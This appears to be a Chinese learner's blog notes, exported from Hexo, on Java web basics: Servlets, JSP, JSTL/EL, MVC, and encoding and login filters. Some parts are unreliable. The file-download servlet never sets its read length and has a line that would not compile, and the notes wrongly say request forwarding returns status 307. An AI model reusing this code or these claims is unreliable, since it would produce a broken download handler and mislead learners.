方法2\n\n修改web.xml\n\n![image-20220115215913478](https://gitee.com/blue_satchel/images/raw/master/image-20220115215913478.png)\n\n##### <%@include file=\"\"%>\n\n#### 九大内置对象\n\n- pageContext     存东西    还可以forward()转发请求\n- request    存东西\n- Response\n- Session    存东西\n- Application      (ServletContext)存东西\n- config            (ServletConfig)\n- out\n- page    几乎不用\n- exception\n\n对象设置的值的作用域和时间比较\n\n```jsp\n<%\n    pageContext.setAttribute(\"name1\",\"名字1\");//保存的数据只在一个页面中有效(它有个scope参数,可以修改作用域)\n    request.setAttribute(\"name1\",\"名字2\");//保存的数据只在一次请求中有效,请求转发会携带这个数据\n    session.setAttribute(\"name1\",\"名字3\");//保存的数据只在一次会话中有效,从打开浏览器到关闭浏览器\n    application.setAttribute(\"name1\",\"名字4\");//保存的数据只在服务器中有效,从打开服务器到关闭服务器\n%>\n```\n\n一些应用场景\n\nrequest:客户端向服务器发送请求,产生的数据,用户看完就没用了,比如,新闻\n\nsession:客户端向服务器发送请求,产生的数据,用户看完还有用\n\napplication:客户端向服务器发送请求,产生的数据,一个用户用完了,其他用户还可能用,比如:聊天数据\n\n### JSP标签,JSTL标签,EL表达式\n\n需要导入两个包\n\n```xml\n<dependency>\n      <groupId>org.glassfish.web</groupId>\n      <artifactId>jakarta.servlet.jsp.jstl</artifactId>\n      <version>2.0.0</version>\n    </dependency>\n    <!--standard标签库-->\n    <!-- https://mvnrepository.com/artifact/taglibs/standard -->\n    <dependency>\n      <groupId>taglibs</groupId>\n      <artifactId>standard</artifactId>\n      <version>1.1.2</version>\n    </dependency>\n```\n\n#### EL表达式\n\n```jsp\n<%@ page  isELIgnored=\"false\"%>\n```\n\n- 获取数据\n- 执行运算\n- 获取web开发的常用对象\n\n比如获取表单中的数据${param.参数名}\n\n![image-20220116002754237](https://gitee.com/blue_satchel/images/raw/master/image-20220116002754237.png)\n\n- ~~调用java方法~~\n\n#### JSP标签\n\n可以通过标签转发请求并携带参数\n\n```jsp\n<%--<jsp:include page=\"page1.jsp\"></jsp:include>--%>\n<jsp:forward page=\"page1.jsp\">\n    <jsp:param name=\"user\" value=\"wuhu\"/>\n    <jsp:param name=\"pwd\" value=\"***\"/>\n</jsp:forward>\n```\n\n#### JSTL表达式\n\n<label style=\"background:yellow\">JSTL标签库的使用就是为了弥补HTML标签的不足</label>\n\n东西太多了,边用边查就行,使用前记得导包\n\n##### 核心标签(重点掌握一下)\n\n要先在jsp页面中引入JSTL核心标签库\n\n```jsp\n<%@taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\" %>\n```\n\n##### JSTL标签库使用步骤\n\n- 引入对应的taglib\n- 使用其中的方法\n- 在Tomcat  lib中也需要引入JSTL的包,否则会报JSTL解析错误(其他包的解析错误也可用同样的方法手动导入到lib目录)\n\n```jsp\n<%\n    ArrayList<String> students =new ArrayList<>();\n    students.add(\"张三\");\n    students.add(\"李四\");\n    students.add(\"王五\");\n    students.add(\"赵六\");\n    request.setAttribute(\"list\",students);\n%>\n<c:forEach var=\"student\" items=\"${list}\">\n    <c:out value=\"${student}\"/><br>\n\n</c:forEach>\n```\n\n![image-20220116130300211](https://gitee.com/blue_satchel/images/raw/master/image-20220116130300211.png)\n\n在使用jstl的过程中出现了诸多问题,对于notFoundclass这一类的问题的同意解决办法就是手动导入jstl1.2和standard1.1.2包到WEB-INF目录下的lib目录和tomcat的lib目录下,切记,不能2.0的包和1.2的包混着用\n\n对于使用maven阿里云镜像无法导入jstl1.2我表示真坑\n\n#### javaBean\n\n实体类\n\njavaBean有特定的写法\n\n- 必须要有一个无参构造\n- 属性必须私有化\n- 必须有对应的get/set方法\n\n一般用来和数据库的字段做映射 ORM:\n\n##### ORM: 对象关系映射\n\n- 表---->类\n- 字段----->属性\n- 行记录----->对象\n\n### MVC三层架构\n\nModel  View  Controller 模型,视图,控制器\n\n![image-20220116213212850](https://gitee.com/blue_satchel/images/raw/master/image-20220116213212850.png)\n\nModel\n\n- 业务处理:业务逻辑(service)\n- 数据持久层: CRUD (Dao)\n\nView\n\n- 展示数据\n- 提供链接发起Servlet请求\n\nController\n\n- 接收用户的请求(req:请求参数,Session信息...)\n- 交给业务层处理对应的代码\n- 控制视图的跳转\n\n```\n登录--->接收用户的登录请求--->处理用户的请求(获取用户登录的参数)--->交给业务层处理登录业务(判断用户名密码是否正确)--->Dao层查询用户名和密码是否正确\n```\n\n### Filter\n\nFilter过滤器,用来过滤网站的数据:\n\nweb服务有一些垃圾请求,后台不应该处理,或者应该直接报错\n\n- 处理中文乱码\n- 登录验证......\n\nFilter开发步骤\n\n1.导包\n\n2.编写过滤器\n\n- 导包别错,是servlet下面的filter\n- 配置好web.xml,并且注意要过滤的路径\n\n\n\n例子\n\nweb.xml中配置的内容,和servlet配置很像,`<url-pattern>/*</url-pattern>`表示要过滤的部分,和servlet的urlpattern相对应,属于包含关系了\n\n```xml\n<filter>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <filter-class>CharacterEncodingFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <!--只要是经过/的请求,都会经过这个过滤器-->\n    <url-pattern>/*</url-pattern>\n  </filter-mapping>\n```\n\nCharacterEncodingFilter.java\n\n```java\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class CharacterEncodingFilter implements Filter {\n    @Override\n    //初始化\n    public void init(FilterConfig filterConfig) throws ServletException {\n\n    }\n\n    @Override\n    //filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        servletRequest.setCharacterEncoding(\"utf-8\");\n        servletResponse.setCharacterEncoding(\"utf-8\");\n        servletResponse.setContentType(\"text/html;charset=UTF-8\");\n        filterChain.doFilter(servletRequest,servletResponse);//让请求继续走,不写程序就会在这里停止\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n}\n\n```\n\n![image-20220116223839656](https://gitee.com/blue_satchel/images/raw/master/image-20220116223839656.png)\n\n没过滤之前乱码\n\n![image-20220116223824121](https://gitee.com/blue_satchel/images/raw/master/image-20220116223824121.png)\n\n过滤后\n\n![image-20220116223932653](https://gitee.com/blue_satchel/images/raw/master/image-20220116223932653.png)\n\n### 监听器\n\n实现一个监听器的接口,有很多种,具体具体实现,和filter设置\n\n1.编写一个监听器\n\n- 实现监听器接口\n\n2.web.xml中配置监听器\n\n3.看情况是否使用\n\n### 过滤器应用\n\n比如是否已经登录成功的校验,这样在访问网站需要登录才能访问的资源时,会经过一次loginFilter来校验,并决定是否允许其访问,这样在每次访问对应页面时候,就不用重复写校验是否已经登录的代码了\n\n```java\npublic class loginFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n    }\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        //servletrequest拿不到session,做类型转换,转换成它爹httpservletrequest,response同理\n        HttpServletRequest request=(HttpServletRequest) servletRequest;\n        HttpServletResponse response=(HttpServletResponse) servletResponse;\n        if(request.getSession().getAttribute(\"USER_SESSION\")==null){\n            response.sendRedirect(\"/error.jsp\");\n\n        }else{\n            filterChain.doFilter(request,response);//已经登录则将请求传递下去给\n        }\n    }\n    @Override\n    public void destroy() {\n    }\n}\n```\n\n\n\n","source":"_posts/java-web.md","raw":"---\ntitle: java_web\ndate: 2022-01-11 20:38:27\ntags:\n      - java_web\ncategories: java\n---\n\nhttp1.0:客户端与web服务器连接后,只能获得一个web资源,断开连接\n\nhttp2.0: 客户端与web服务器连接后,可以获得多个web资源\n\n<!--more-->\n\n##### Http响应\n\n响应状态码\n\n200: 请求响应成功\n\n3**: 请求重定向\n\n4**: 找不到资源\n\n5**: 服务器代码错误500 502(网关错误)\n\n##### MAVEN环境配置\n\nM2_HOME   maven目录下的bin目录\n\nMAVEN_HOME  maven目录\n\npath中配置  %MAVEN_HOME%\\bin\n\n#### Servlet\n\n##### Servlet简介\n\n要在web.xml中导包\n\n- Servlet就是sun公司开发动态web的一门技术\n- Sun在这些API中提供一个接口叫做:Servlet,如果你想开发一个Servlet程序,只需要完成两个小步骤:\n  - 编写一个类,实现Servlet接口\n  - 把开发好的java类部署到web服务器中\n\nHelloServlet\n\n```java\npublic class helloServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        PrintWriter writer=resp.getWriter();//响应流\n        writer.println(\"hello,Servlet\");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n\n    }\n}\n```\n\n目录结构\n\n![image-20220113162720716](https://gitee.com/blue_satchel/images/raw/master/image-20220113162720716.png)\n\n##### 编写Servlet映射\n\n写的是java程序,但是要通过浏览器访问,而浏览器需要连接web服务器,所以我们需要在web服务中注册我们写的servlet,还需要给它一个浏览器能够访问的路径\n\n![image-20220113162502747](https://gitee.com/blue_satchel/images/raw/master/image-20220113162502747.png)\n\n![image-20220113162617543](https://gitee.com/blue_satchel/images/raw/master/image-20220113162617543.png)\n\n请求/hello后,会在web.xml中找/hello对应的servlet-name  hello,然后再向上找hello对应的servlet-class\n\n##### servlet原理\n\n本质上就是requset调用servlet中的service抽象类中我们自己实现的方法,再返回给servlet\n\n![image-20220113163642745](https://gitee.com/blue_satchel/images/raw/master/image-20220113163642745.png)\n\n##### Mapping问题\n\n- 一个servlet可以指定一个或者多个路径,(本质上都是请求同一个class)\n\n- 一个servlet可以指定通用(默认)映射路径\n\n  - ```xml\n    <servlet-mapping>\n    \t<servlet-name>hello</servlet-name>\n        <url-pattern>/hello/*</url-pattern>  <!--请求hello/下的都会请求到hello-->\n    </servlet-mapping>\n    ```\n\n- 默认请求路径(等于替代掉了index吧....)\n\n  - ```xml\n    <servlet-mapping>\n    \t<servlet-name>hello</servlet-name>\n        <url-pattern>/*</url-pattern>  <!--默认请求到hello-->\n    </servlet-mapping>\n    ```\n\n    \n\n- 可以自定义后缀实现请求映射(类似于正则)\n\n  - ```xml\n    <servlet-mapping>\n    \t<servlet-name>hello</servlet-name>\n        <url-pattern>*.abcd</url-pattern>  <!--只要请求后缀有abcd都会映射到hello-->\n    </servlet-mapping>\n    ```\n\n    \n\n#### ServletContext\n\nweb容器在启动的时候,它会为每个web程序都创建一个对应的ServletContext对象,它代表了当前的web应用\n\n##### 共享数据\n\n很像android中页面传参的intent.putExtra和intent.getExtra\n\n- 在一个servlet中保存的数据,可以在另外一个servlet中拿到\n\n有一说一,java万物皆对象的思想确实牛逼,继承了直接就可以用父类方法,不同子类还能互动\n\n![image-20220113173732922](https://gitee.com/blue_satchel/images/raw/master/image-20220113173732922.png)\n\n![image-20220113173739121](https://gitee.com/blue_satchel/images/raw/master/image-20220113173739121.png)\n\n![image-20220113173749274](https://gitee.com/blue_satchel/images/raw/master/image-20220113173749274.png)\n\n![image-20220113173756430](https://gitee.com/blue_satchel/images/raw/master/image-20220113173756430.png)\n\n注意点:因为setAttribute写在了helloServlet中的doGet里面,所以要先请求一下/hello,再去请求/getname\n\n记得类型转换为String\n\n##### 获取初始化参数\n\nweb.xml中\n\n```xml\n<context-param>\n    <param-name>url</param-name>\n    <param-value>jdbc:mysql//localhost:3306/mybatis</param-value>\n</context-param>\n```\n\njava类里面\n\n```java\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        resp.setContentType(\"text/html\");\n        resp.setCharacterEncoding(\"utf-8\");\n        ServletContext context=this.getServletContext();\n        String url = context.getInitParameter(\"url\");\n        resp.getWriter().print(url)        \n    }\n```\n\n请求对应页面会打印出jdbc:mysql//localhost:3306/mybatis\n\n##### 请求转发\n\n```java\npublic class dispatcher extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        ServletContext context= this.getServletContext();\n        context.getRequestDispatcher(\"/hello\").forward(req,resp);\n    }\n}\n```\n\n请求sd就等于请求了/hello,并且浏览器状态码为200,不是3**的重定向\n\n我觉得对于安全性来说很好,A请求B,B可以去请求C的内容,虽然A得到了C的内容,但是A永远只和B交流\n\n\n\n![image-20220113222128264](https://gitee.com/blue_satchel/images/raw/master/image-20220113222128264.png)\n\n##### 读取资源(配置)文件\n\nProperties\n\n- 在java目录下新建properties\n- 在resources目录下新建properties\n\n发现:都被打包到了同一个路径下:classes,俗称这个路径为classpath\n\n需要一个文件流\n\n### \n\n### HttpServletResponse\n\nweb服务器接收到客户端的http请求,针对这个请求,分别创建一个代表请求的HttpServletRequest对象,代表响应的一个HttpServletResponse对象\n\n获取客户端请求过来的参数,找HttpServletRequest\n\n如果要给客户端响应信息,找HttpServletResponse\n\n#### 响应状态码\n\n```java\nint SC_CONTINUE = 100;\n    int SC_SWITCHING_PROTOCOLS = 101;\n    int SC_OK = 200;\n    int SC_CREATED = 201;\n    int SC_ACCEPTED = 202;\n    int SC_NON_AUTHORITATIVE_INFORMATION = 203;\n    int SC_NO_CONTENT = 204;\n    int SC_RESET_CONTENT = 205;\n    int SC_PARTIAL_CONTENT = 206;\n    int SC_MULTIPLE_CHOICES = 300;\n    int SC_MOVED_PERMANENTLY = 301;\n    int SC_MOVED_TEMPORARILY = 302;\n    int SC_FOUND = 302;\n    int SC_SEE_OTHER = 303;\n    int SC_NOT_MODIFIED = 304;\n    int SC_USE_PROXY = 305;\n    int SC_TEMPORARY_REDIRECT = 307;\n    int SC_BAD_REQUEST = 400;\n    int SC_UNAUTHORIZED = 401;\n    int SC_PAYMENT_REQUIRED = 402;\n    int SC_FORBIDDEN = 403;\n    int SC_NOT_FOUND = 404;\n    int SC_METHOD_NOT_ALLOWED = 405;\n    int SC_NOT_ACCEPTABLE = 406;\n    int SC_PROXY_AUTHENTICATION_REQUIRED = 407;\n    int SC_REQUEST_TIMEOUT = 408;\n    int SC_CONFLICT = 409;\n    int SC_GONE = 410;\n    int SC_LENGTH_REQUIRED = 411;\n    int SC_PRECONDITION_FAILED = 412;\n    int SC_REQUEST_ENTITY_TOO_LARGE = 413;\n    int SC_REQUEST_URI_TOO_LONG = 414;\n    int SC_UNSUPPORTED_MEDIA_TYPE = 415;\n    int SC_REQUESTED_RANGE_NOT_SATISFIABLE = 416;\n    int SC_EXPECTATION_FAILED = 417;\n    int SC_INTERNAL_SERVER_ERROR = 500;\n    int SC_NOT_IMPLEMENTED = 501;\n    int SC_BAD_GATEWAY = 502;\n    int SC_SERVICE_UNAVAILABLE = 503;\n    int SC_GATEWAY_TIMEOUT = 504;\n    int SC_HTTP_VERSION_NOT_SUPPORTED = 505;\n```\n\n#### 常见应用\n\n##### 1.向浏览器输出消息\n\ngetWriter(),getOutputStream()\n\n![image-20220113224928187](https://gitee.com/blue_satchel/images/raw/master/image-20220113224928187.png)\n\n##### 2.下载文件\n\n1. 要获取下载文件路径\n2. 下载文件名是啥\n3. 设置想办法让浏览器能够支持下载我们需要的东西\n4. 获取下载文件的输入流\n5. 创建缓冲区\n6. 获取OutputStream对象\n7. 将FileOutputStream流写入到buffer缓冲区\n8. 使用OutputStream将缓冲区中的数据输出到客户端\n\n```java\npackage com.blue.servlet;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletOutputStream;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class down extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String realPath=\"F:\\\\Project\\\\maven\\\\maven_web_1\\\\src\\\\main\\\\resources\\\\img.png\";\n        //2.获取下载文件名\n        String filename=realPath.substring(realPath.lastIndexOf(\"\\\\\")+1);\n        //3.设置头\n        /中文文件名的话还要设置编码\n        resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+filename);\n        //4.获取下载文件的输入流\n        FileInputStream in=new FileInputStream(realPath);\n        //5.创建缓冲区\n        int len=0;\n        byte[] buffer=new byte[1024];\n        //6.获取OutputStream对象\n        ServletOutputStream out=resp.getOutputStream();\n        //7.将fileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端\n        while (in.read(buffer)>0){\n            out.write(buffer,0,len);\n        }\n        in.close();\n        out.close();\n    }\n}\n\n```\n\n#### 实现网页重定向\n\n不同于servlet的资源请求重定向,response是通过浏览器实现的重定向\n\n`resp.sendRedirect(\"路径\");`\n\n`&{pageContext.request.contextPath}`代表当前项目路径\n\n重定向和转发的区别:\n\n编码:转发307,重定向302\n\n相同点:页面都会跳转\n\n不同点:url变与不变\n\n\n\n\n\n\n\n### HttpServletRequest\n\n通过HttpServletRequest获取客户端的信息\n\n获取前端提交的参数\n\n`req.getParameter(\"username\");`\n\n`getParamaterValues();`返回一个字符数组\n\n#### Cookie\n\n- 一个Cookie只能保存一个信息\n- 一个web站点可以给浏览器发送多个cookie,最多存放20个cookie\n- cookie大小有限制4kb\n- 300个cookie浏览器上限\n\n删除Cookie\n\n- 不设置有效期,关闭浏览器,自动失效\n- 设置有效期为0\n\n传递中文记得使用URLEncoder.encode(\"中文\",\"utf-8\");\n\n#### Session\n\n- 服务器会给每一个用户(浏览器)创建一个Session对象\n- 一个Session独占一个浏览器,只要浏览器没有关闭,这个Session就存在\n- 用户登录之后,整个网站它都可以访问\n\n### JSP\n\nJAVA Server Pages\n\n最大特点:\n\n- 写JSP就像在写HTML\n- 区别:\n  - HTML静态数据\n  - JSP页面可以嵌入JAVA代码,为用户提供动态数据\n\nJSP本质上就是Servlet\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220114211237653.png\" alt=\"image-20220114211237653\"  />\n\n##### jsp与对应jsp.java转换关系\n\n只要是java代码就原封不动的输出\n\n如果是HTML代码,就会被转换为:\n\n```\nout.write(\"<xxxxxxx>\")\n```\n\n\n\n#### JSP基础语法\n\n开始前要先导入依赖,[maven依赖在线查询](https://mvnrepository.com/)\n\n```xml\n<!--Servlet依赖-->\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>javax.servlet-api</artifactId>\n      <version>3.1.0</version>\n    </dependency>\n    <!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api -->\n    <!--JSP依赖-->\n    <dependency>\n      <groupId>javax.servlet.jsp</groupId>\n      <artifactId>javax.servlet.jsp-api</artifactId>\n      <version>2.3.3</version>\n      <scope>provided</scope>\n    </dependency>\n    <!--JSTL表达式的依赖-->\n\n    <dependency>\n      <groupId>org.glassfish.web</groupId>\n      <artifactId>jakarta.servlet.jsp.jstl</artifactId>\n      <version>2.0.0</version>\n    </dependency>\n    <!--standard标签库-->\n    <!-- https://mvnrepository.com/artifact/taglibs/standard -->\n    <dependency>\n      <groupId>taglibs</groupId>\n      <artifactId>standard</artifactId>\n      <version>1.1.2</version>\n    </dependency>\n\n```\n\n#### 语法\n\n##### 表达式\n\n```jsp\n<%=变量或者表达式%>\n<%=new java.util.Date()%>\n\n```\n\n可以用${变量名}(EL表达式)代替,更高级,并且会将一些错误默认不显示,比如不存在的变量\n\n##### 脚本片段\n\n```jsp\n<%\n\tjava脚本片段\n%>\n```\n\n##### JSP声明\n\n```jsp\n<%!\nprivate int globalVar = 0;    \n%>\n```\n\n会被编译到jsp生成的java类中,其他的会被生成到对应的java文件中的jspService方法中\n\n##### 在代码中嵌入HTML元素\n\n```jsp\n<html>\n<body>\n<%for (int i=0;i<5;i++){\n    %>\n    <h1>hello,world <%=i%> </h1>\n<%\n    }\n%>\n</body>\n</html>\n```\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115211903441.png\" alt=\"image-20220115211903441\" style=\"zoom:80%;\" />\n\n### JSP指令\n\n##### 配置错误页面<%@page  args...%>\n\n##### 方法1\n\n![image-20220115215532167](https://gitee.com/blue_satchel/images/raw/master/image-20220115215532167.png)\n\n```jsp\n<%@page errorPage=\"error/500.jsp\" %>\n```\n\n##### 方法2\n\n修改web.xml\n\n![image-20220115215913478](https://gitee.com/blue_satchel/images/raw/master/image-20220115215913478.png)\n\n##### <%@include file=\"\"%>\n\n#### 九大内置对象\n\n- pageContext     存东西    还可以forward()转发请求\n- request    存东西\n- Response\n- Session    存东西\n- Application      (ServletContext)存东西\n- config            (ServletConfig)\n- out\n- page    几乎不用\n- exception\n\n对象设置的值的作用域和时间比较\n\n```jsp\n<%\n    pageContext.setAttribute(\"name1\",\"名字1\");//保存的数据只在一个页面中有效(它有个scope参数,可以修改作用域)\n    request.setAttribute(\"name1\",\"名字2\");//保存的数据只在一次请求中有效,请求转发会携带这个数据\n    session.setAttribute(\"name1\",\"名字3\");//保存的数据只在一次会话中有效,从打开浏览器到关闭浏览器\n    application.setAttribute(\"name1\",\"名字4\");//保存的数据只在服务器中有效,从打开服务器到关闭服务器\n%>\n```\n\n一些应用场景\n\nrequest:客户端向服务器发送请求,产生的数据,用户看完就没用了,比如,新闻\n\nsession:客户端向服务器发送请求,产生的数据,用户看完还有用\n\napplication:客户端向服务器发送请求,产生的数据,一个用户用完了,其他用户还可能用,比如:聊天数据\n\n### JSP标签,JSTL标签,EL表达式\n\n需要导入两个包\n\n```xml\n<dependency>\n      <groupId>org.glassfish.web</groupId>\n      <artifactId>jakarta.servlet.jsp.jstl</artifactId>\n      <version>2.0.0</version>\n    </dependency>\n    <!--standard标签库-->\n    <!-- https://mvnrepository.com/artifact/taglibs/standard -->\n    <dependency>\n      <groupId>taglibs</groupId>\n      <artifactId>standard</artifactId>\n      <version>1.1.2</version>\n    </dependency>\n```\n\n#### EL表达式\n\n```jsp\n<%@ page  isELIgnored=\"false\"%>\n```\n\n- 获取数据\n- 执行运算\n- 获取web开发的常用对象\n\n比如获取表单中的数据${param.参数名}\n\n![image-20220116002754237](https://gitee.com/blue_satchel/images/raw/master/image-20220116002754237.png)\n\n- ~~调用java方法~~\n\n#### JSP标签\n\n可以通过标签转发请求并携带参数\n\n```jsp\n<%--<jsp:include page=\"page1.jsp\"></jsp:include>--%>\n<jsp:forward page=\"page1.jsp\">\n    <jsp:param name=\"user\" value=\"wuhu\"/>\n    <jsp:param name=\"pwd\" value=\"***\"/>\n</jsp:forward>\n```\n\n#### JSTL表达式\n\n<label style=\"background:yellow\">JSTL标签库的使用就是为了弥补HTML标签的不足</label>\n\n东西太多了,边用边查就行,使用前记得导包\n\n##### 核心标签(重点掌握一下)\n\n要先在jsp页面中引入JSTL核心标签库\n\n```jsp\n<%@taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\" %>\n```\n\n##### JSTL标签库使用步骤\n\n- 引入对应的taglib\n- 使用其中的方法\n- 在Tomcat  lib中也需要引入JSTL的包,否则会报JSTL解析错误(其他包的解析错误也可用同样的方法手动导入到lib目录)\n\n```jsp\n<%\n    ArrayList<String> students =new ArrayList<>();\n    students.add(\"张三\");\n    students.add(\"李四\");\n    students.add(\"王五\");\n    students.add(\"赵六\");\n    request.setAttribute(\"list\",students);\n%>\n<c:forEach var=\"student\" items=\"${list}\">\n    <c:out value=\"${student}\"/><br>\n\n</c:forEach>\n```\n\n![image-20220116130300211](https://gitee.com/blue_satchel/images/raw/master/image-20220116130300211.png)\n\n在使用jstl的过程中出现了诸多问题,对于notFoundclass这一类的问题的同意解决办法就是手动导入jstl1.2和standard1.1.2包到WEB-INF目录下的lib目录和tomcat的lib目录下,切记,不能2.0的包和1.2的包混着用\n\n对于使用maven阿里云镜像无法导入jstl1.2我表示真坑\n\n#### javaBean\n\n实体类\n\njavaBean有特定的写法\n\n- 必须要有一个无参构造\n- 属性必须私有化\n- 必须有对应的get/set方法\n\n一般用来和数据库的字段做映射 ORM:\n\n##### ORM: 对象关系映射\n\n- 表---->类\n- 字段----->属性\n- 行记录----->对象\n\n### MVC三层架构\n\nModel  View  Controller 模型,视图,控制器\n\n![image-20220116213212850](https://gitee.com/blue_satchel/images/raw/master/image-20220116213212850.png)\n\nModel\n\n- 业务处理:业务逻辑(service)\n- 数据持久层: CRUD (Dao)\n\nView\n\n- 展示数据\n- 提供链接发起Servlet请求\n\nController\n\n- 接收用户的请求(req:请求参数,Session信息...)\n- 交给业务层处理对应的代码\n- 控制视图的跳转\n\n```\n登录--->接收用户的登录请求--->处理用户的请求(获取用户登录的参数)--->交给业务层处理登录业务(判断用户名密码是否正确)--->Dao层查询用户名和密码是否正确\n```\n\n### Filter\n\nFilter过滤器,用来过滤网站的数据:\n\nweb服务有一些垃圾请求,后台不应该处理,或者应该直接报错\n\n- 处理中文乱码\n- 登录验证......\n\nFilter开发步骤\n\n1.导包\n\n2.编写过滤器\n\n- 导包别错,是servlet下面的filter\n- 配置好web.xml,并且注意要过滤的路径\n\n\n\n例子\n\nweb.xml中配置的内容,和servlet配置很像,`<url-pattern>/*</url-pattern>`表示要过滤的部分,和servlet的urlpattern相对应,属于包含关系了\n\n```xml\n<filter>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <filter-class>CharacterEncodingFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <!--只要是经过/的请求,都会经过这个过滤器-->\n    <url-pattern>/*</url-pattern>\n  </filter-mapping>\n```\n\nCharacterEncodingFilter.java\n\n```java\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class CharacterEncodingFilter implements Filter {\n    @Override\n    //初始化\n    public void init(FilterConfig filterConfig) throws ServletException {\n\n    }\n\n    @Override\n    //filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        servletRequest.setCharacterEncoding(\"utf-8\");\n        servletResponse.setCharacterEncoding(\"utf-8\");\n        servletResponse.setContentType(\"text/html;charset=UTF-8\");\n        filterChain.doFilter(servletRequest,servletResponse);//让请求继续走,不写程序就会在这里停止\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n}\n\n```\n\n![image-20220116223839656](https://gitee.com/blue_satchel/images/raw/master/image-20220116223839656.png)\n\n没过滤之前乱码\n\n![image-20220116223824121](https://gitee.com/blue_satchel/images/raw/master/image-20220116223824121.png)\n\n过滤后\n\n![image-20220116223932653](https://gitee.com/blue_satchel/images/raw/master/image-20220116223932653.png)\n\n### 监听器\n\n实现一个监听器的接口,有很多种,具体具体实现,和filter设置\n\n1.编写一个监听器\n\n- 实现监听器接口\n\n2.web.xml中配置监听器\n\n3.看情况是否使用\n\n### 过滤器应用\n\n比如是否已经登录成功的校验,这样在访问网站需要登录才能访问的资源时,会经过一次loginFilter来校验,并决定是否允许其访问,这样在每次访问对应页面时候,就不用重复写校验是否已经登录的代码了\n\n```java\npublic class loginFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n    }\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        //servletrequest拿不到session,做类型转换,转换成它爹httpservletrequest,response同理\n        HttpServletRequest request=(HttpServletRequest) servletRequest;\n        HttpServletResponse response=(HttpServletResponse) servletResponse;\n        if(request.getSession().getAttribute(\"USER_SESSION\")==null){\n            response.sendRedirect(\"/error.jsp\");\n\n        }else{\n            filterChain.doFilter(request,response);//已经登录则将请求传递下去给\n        }\n    }\n    @Override\n    public void destroy() {\n    }\n}\n```\n\n\n\n","slug":"java-web","published":1,"updated":"2022-01-17T07:12:38.994Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mf000xgsw94mcf7m0v","content":"<p>http1.0:客户端与web服务器连接后,只能获得一个web资源,断开连接</p>\n<p>http2.0: 客户端与web服务器连接后,可以获得多个web资源</p>\n<span id=\"more\"></span>\n\n<h5 id=\"Http响应\"><a href=\"#Http响应\" class=\"headerlink\" title=\"Http响应\"></a>Http响应</h5><p>响应状态码</p>\n<p>200: 请求响应成功</p>\n<p>3**: 请求重定向</p>\n<p>4**: 找不到资源</p>\n<p>5**: 服务器代码错误500 502(网关错误)</p>\n<h5 id=\"MAVEN环境配置\"><a href=\"#MAVEN环境配置\" class=\"headerlink\" title=\"MAVEN环境配置\"></a>MAVEN环境配置</h5><p>M2_HOME   maven目录下的bin目录</p>\n<p>MAVEN_HOME  maven目录</p>\n<p>path中配置  %MAVEN_HOME%\\bin</p>\n<h4 id=\"Servlet\"><a href=\"#Servlet\" class=\"headerlink\" title=\"Servlet\"></a>Servlet</h4><h5 id=\"Servlet简介\"><a href=\"#Servlet简介\" class=\"headerlink\" title=\"Servlet简介\"></a>Servlet简介</h5><p>要在web.xml中导包</p>\n<ul>\n<li>Servlet就是sun公司开发动态web的一门技术</li>\n<li>Sun在这些API中提供一个接口叫做:Servlet,如果你想开发一个Servlet程序,只需要完成两个小步骤:<ul>\n<li>编写一个类,实现Servlet接口</li>\n<li>把开发好的java类部署到web服务器中</li>\n</ul>\n</li>\n</ul>\n<p>HelloServlet</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">helloServlet</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span 